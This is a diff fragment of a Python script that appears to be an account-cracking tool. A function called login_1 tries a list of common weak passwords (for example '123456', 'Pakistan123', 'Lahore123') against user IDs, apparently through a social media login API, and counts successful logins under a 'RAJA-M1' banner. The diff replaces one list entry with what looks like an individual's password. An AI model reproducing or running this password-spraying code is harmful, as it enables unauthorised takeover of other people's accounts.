@@ -580,7 +580,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[1;95mRAJA-M1\x1b[38;5;51m]\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[38;5;226m{loop}\x1b[38;5;51m]\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[1;92mOK\x1b[38;5;51m]\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[38;5;46m{len(oks)}\x1b[38;5;51m]")
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789', '786786', 'pakistan123', 'Pakistan123', 'Pakistan1234', 'Pakistan12345', 'Pakistan', 'Pakistan', 'Lahore123', 'Lahore1234', 'lahore', 'iloveyou'):
+        for pw in ('123456', '1234567', '12345678', '123456789', '786786', 'pakistan123', 'Pakistan123', 'Pakistan1234', 'Pakistan12345', 'saeed20749', 'Pakistan', 'Lahore123', 'Lahore1234', 'lahore', 'iloveyou'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
